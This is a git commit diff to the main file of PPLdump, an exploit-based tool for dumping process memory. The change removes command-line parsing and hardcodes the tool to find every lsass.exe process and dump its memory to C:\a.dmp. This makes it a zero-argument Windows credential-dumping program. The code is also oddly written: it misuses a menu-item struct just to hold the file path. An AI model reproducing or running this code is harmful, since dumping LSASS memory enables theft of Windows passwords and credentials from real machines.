b68997a6a7b45009519308ee437344ca21c0ef97
keks411 <osterwald@posteo.de>
2021-11-18 03:34:05 -0800

    replaced ppldump.cpp with createtoolhelp32snapshot

--- PPLdump/PPLdump.cpp
+++ PPLdump/PPLdump.cpp
@@ -1,6 +1,9 @@
 #include "exploit.h"
 
 #include <iostream>
+#include <windows.h>
+#include <tlhelp32.h>
+#include <vector>
 
 BOOL g_bVerbose = FALSE;
 BOOL g_bDebug = FALSE;
@@ -9,21 +12,33 @@ DWORD g_dwProcessId = 0;
 LPWSTR g_pwszDumpFilePath = NULL;
 LPWSTR g_pwszProcessName = NULL;
 
-int wmain(int argc, wchar_t* argv[])
+
+int wmain()
 {
-    if (!ParseArguments(argc, argv))
-        return 1;
+    //int argc, wchar_t* argv[]
+   // if (!ParseArguments(argc, argv))
+   //     return 1;
 
-    //PrintArguments();
+    std::vector<DWORD> pids;
+    std::wstring targetProcessName = L"lsass.exe";
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //all processes
+    PROCESSENTRY32W entry; //current process
+    entry.dwSize = sizeof entry;
 
-    if (g_pwszProcessName != NULL)
-    {
-        DumpProcessByName(g_pwszProcessName, g_pwszDumpFilePath);
+    if (!Process32FirstW(snap, &entry)) { //start with the first in snapshot
+        return 0;
     }
-    else if (g_dwProcessId != 0)
-    {
-        DumpProcess(g_dwProcessId, g_pwszDumpFilePath);
-    }
 
-    return 0;
+    do {
+        if (std::wstring(entry.szExeFile) == targetProcessName) {
+            pids.emplace_back(entry.th32ProcessID); //name matches; add to list
+            g_dwProcessId = entry.th32ProcessID;
+            MENUITEMINFO mii = { sizeof(mii) };
+            mii.dwTypeData = const_cast<LPTSTR>(TEXT("C:\\a.dmp"));
+            DumpProcess(g_dwProcessId, mii.dwTypeData);
+        }
+    } while (Process32NextW(snap, &entry)); //keep going until end of snapshot
+
 }
+
+
